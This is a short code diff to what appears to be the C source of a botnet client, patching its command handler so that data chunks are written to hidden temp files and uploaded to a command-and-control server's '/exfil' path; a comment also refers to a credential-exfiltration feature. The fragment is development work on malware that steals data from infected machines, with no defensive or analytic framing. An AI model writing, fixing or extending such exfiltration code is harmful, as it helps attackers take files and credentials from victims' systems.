@@ -2497,8 +2497,14 @@ int protocol_process_commands(notnet_bot_t *bot) {
                             char upload_path[512];
                             snprintf(upload_path, sizeof(upload_path),
                                 "%s/exfil", bot->c2_http.path);
-                            http_upload(bot, "/dev/stdin", upload_path);
-                            /* For simplicity, write chunk to temp file */
+                            /* Write chunk to temp file, then upload the temp
+                             * file. (#115): the old draft called
+                             * http_upload(bot, "/dev/stdin", ...) here —
+                             * a leftover from a different design; every
+                             * chunk after the first produced a spurious
+                             * upload error (and would leak stdin if it was
+                             * a regular file). The exfil_creds chunking
+                             * (written later, #90) has no such call. */
                             char tmp[256];
                             snprintf(tmp, sizeof(tmp), "/tmp/.exfil.%d", offset);
                             FILE *tf = fopen(tmp, "wb");
